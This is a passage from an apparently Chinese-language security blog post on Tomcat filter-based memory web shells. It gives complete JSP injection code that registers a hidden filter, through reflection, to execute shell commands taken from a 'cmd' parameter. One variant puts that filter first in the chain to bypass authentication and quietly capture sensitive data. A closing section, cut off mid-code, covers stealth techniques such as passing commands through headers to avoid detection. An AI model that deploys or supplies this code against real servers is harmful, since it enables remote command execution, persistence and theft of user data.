class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;shell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shellfilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>            <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                isLinux = <span class="hljs-literal">false</span>;<br>            &#125;<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\a&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            System.out.println(<span class="hljs-string">&quot;Shellfilter 执行命令结果: &quot;</span> + output);<br>            out.flush();<br>            out.close();<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">//拿到standardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">applicationField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span>  (ApplicationContext) applicationField.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span>  (StandardContext) standardContextField.get(applicationContext);<br><br>    <span class="hljs-comment">//设置filterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterClass(Shellfilter.class.getName());<br>    filterDef.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shellfilter</span>());<br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">//设置filterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>); <span class="hljs-comment">//设置要映射的url</span><br>    filterMap.setDispatcher(DispatcherType.REQUEST.name()); <span class="hljs-comment">//设置分派类型,REQUEST表示普通的 HTTP 请求</span><br>    standardContext.addFilterMap(filterMap);<br><br>    <span class="hljs-comment">//将standardContext和filterDef放到filterConfig中</span><br>    <span class="hljs-type">Class</span> <span class="hljs-variable">configclass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);<br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">configconstructor</span> <span class="hljs-operator">=</span> configclass.getDeclaredConstructor(Context.class,FilterDef.class);<br>    configconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">FilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (FilterConfig) configconstructor.newInstance(standardContext,filterDef);<br><br>    <span class="hljs-comment">//反射获取filterConfig</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">configsfield</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    configsfield.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) configsfield.get(standardContext);<br>    filterConfigs.put(<span class="hljs-string">&quot;Shellfilter&quot;</span>,filterConfig);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure>

<p>访问shell.jsp触发注入内存马</p>
<p>内存马的filter匹配的是/*，也就是所有路由</p>
<p><img src="/mdimg/javamemshell1/1757925693353-ec06947e-7212-47f3-9f1a-cd3cc0731cee.png" srcset="/img/loading.gif" lazyload></p>
<p>即使路由不存在</p>
<p><img src="/mdimg/javamemshell1/1757925784614-93a4f800-dd06-468b-aaf0-9168ee0a9d58.png" srcset="/img/loading.gif" lazyload></p>
<p>如果应用中已经存在filter，这里是Myfilter.java定义的/filter路由，</p>
<p><img src="/mdimg/javamemshell1/1757927206967-a64beec3-053e-44ed-8b5f-f6ab368860b4.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到原来的filter和注入的filter都被执行了</p>
<p>并且执行顺序是原来的filter-&gt;注入的filter</p>
<p>这需要在MyFilter中</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">filterChain.doFilter(servletRequest, servletResponse)<br></code></pre></td></tr></table></figure>

<p>放行filter，filter链继续执行下去，如果没有这行则filter链会在当前doFilter中断</p>
<p><img src="/mdimg/javamemshell1/1757935783848-bb935196-fc20-4b1b-ac88-a91a1b57833b.png" srcset="/img/loading.gif" lazyload></p>
<p>所以内存马一般绑定一个自定义不容易重复的路由，避免被同路由的filter拦截中断。</p>
<h5 id="shell-jsp-2"><a href="#shell-jsp-2" class="headerlink" title="shell.jsp 2"></a>shell.jsp 2</h5><blockquote>
<p><strong>重建了整个 Filter 链 → Filter 顺序可控（你用了 <strong><code>**addFilterMapBefore**</code></strong> → 插到最前面）</strong></p>
</blockquote>
<p>filter内存马不仅仅可以命令执行，还可以拦截一些敏感信息和操作，以及身份验证绕过。比如访问后台<code>admin/xxx</code>需要经过filter验证用户是否登录，在修改密码等操作提交前经过filter验证身份证/电话号码是否合法，这时如果注入的filter在所以filter之前，则可以绕过验证，或者拦截一些敏感信息然后放行而不影响正常业务，可以无感获取敏感数据。</p>
<p>要把filter注入到<code>FilterMap</code>前端可以用<code>addFilterMapBefore(...)</code> 方法 然后 <code>filterStop()</code> + <code>filterStart()</code>重建执行链。</p>
<p>shell.jsp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;shell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shellfilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>            System.out.println(<span class="hljs-string">&quot; Shellfilter.init() 被调用！&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            System.out.println(<span class="hljs-string">&quot; Shellfilter.doFilter() 被执行了！&quot;</span>);<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd == <span class="hljs-literal">null</span> || cmd.trim().isEmpty()) &#123;<br>                System.out.println(<span class="hljs-string">&quot;cmd is null&quot;</span>);<br>                filterChain.doFilter(servletRequest, servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> !System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>);<br>            String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds);<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;UTF-8&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br><br>                servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>                servletResponse.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                out.println(<span class="hljs-string">&quot;&lt;pre style=&#x27;background:#000;color:#0f0;&#x27;&gt; Shellfilter Result:\n&quot;</span> + output + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>                out.flush();<br>                out.close();<br>                <span class="hljs-keyword">return</span>;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>                <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>                out.println(<span class="hljs-string">&quot;&lt;pre style=&#x27;color:red;&#x27;&gt; Error: &quot;</span> + e.toString() + <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>                out.flush();<br>                out.close();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot; Shellfilter.destroy() 被调用！&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 拿到 standardContext</span><br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">applicationField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        applicationField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationField.get(servletContext);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>        <span class="hljs-comment">// 设置 filterDef</span><br>        <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>        filterDef.setFilterClass(Shellfilter.class.getName());<br>        filterDef.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>        filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shellfilter</span>());<br><br>        <span class="hljs-comment">//  注册 FilterDef</span><br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">addFilterDefMethod</span> <span class="hljs-operator">=</span> StandardContext.class.getDeclaredMethod(<span class="hljs-string">&quot;addFilterDef&quot;</span>, FilterDef.class);<br>        addFilterDefMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        addFilterDefMethod.invoke(standardContext, filterDef);<br><br>        <span class="hljs-comment">// 设置 filterMap</span><br>        <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>        filterMap.setFilterName(<span class="hljs-string">&quot;Shellfilter&quot;</span>);<br>        filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>        filterMap.setDispatcher(DispatcherType.REQUEST.name());<br><br>        <span class="hljs-comment">//  插入到最前面</span><br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">addFilterMapBeforeMethod</span> <span class="hljs-operator">=</span> StandardContext.class.getDeclaredMethod(<span class="hljs-string">&quot;addFilterMapBefore&quot;</span>, FilterMap.class);<br>        addFilterMapBeforeMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        addFilterMapBeforeMethod.invoke(standardContext, filterMap);<br><br>        <span class="hljs-comment">//  关键！强制重建 Filter 链</span><br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">filterStopMethod</span> <span class="hljs-operator">=</span> StandardContext.class.getDeclaredMethod(<span class="hljs-string">&quot;filterStop&quot;</span>);<br>        filterStopMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        filterStopMethod.invoke(standardContext);<br><br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">filterStartMethod</span> <span class="hljs-operator">=</span> StandardContext.class.getDeclaredMethod(<span class="hljs-string">&quot;filterStart&quot;</span>);<br>        filterStartMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        filterStartMethod.invoke(standardContext);<br><br>        out.println(<span class="hljs-string">&quot; Shellfilter 已注入到 Filter 链最前面，并已激活！&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot; Shellfilter 注入成功，位于 Filter 链首位！&quot;</span>);<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        e.printStackTrace(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.PrintWriter(out));<br>        out.println(<span class="hljs-string">&quot; 注入失败: &quot;</span> + e.toString());<br>    &#125;<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>没注入时，对<code>/filter</code>的filter为Myfilter</p>
<p><img src="/mdimg/javamemshell1/1757937872868-08c2b783-5a67-4bf3-8031-498cdb79a024.png" srcset="/img/loading.gif" lazyload></p>
<p>访问shell.jsp注入</p>
<p><img src="/mdimg/javamemshell1/1757937933144-20345ad9-5a6b-48bd-bc04-01c3a4d4d83b.png" srcset="/img/loading.gif" lazyload></p>
<p><code>/filter?cmd=whoami</code></p>
<p><img src="/mdimg/javamemshell1/1757937988707-9fe7c626-f8bf-41c1-b53a-1769d1e27204.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到先执行shellfilter，myfilter没被执行（shellfilter没有对dofilter放行）</p>
<p>访问filter不加cmd参数，可以更直观看到是<code>shellfilter-&gt;Myfilter</code> （shellfilter的cmd为空时放行dofilter）</p>
<p><img src="/mdimg/javamemshell1/1757938230942-e7a61463-e9d9-4ce6-bde1-b69014d387d2.png" srcset="/img/loading.gif" lazyload></p>
<h5 id="提高隐蔽性"><a href="#提高隐蔽性" class="headerlink" title="提高隐蔽性"></a>提高隐蔽性</h5><p>通常为了内存马更加隐蔽，需要不影响所有正常的路由从而不易被运维或者安全设备发现</p>
<ol>
<li>将参数通过header传递</li>
</ol>
<p>在dofilter获取自定义的特定的header的值作为命令执行的参数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;shell&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shellfilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span 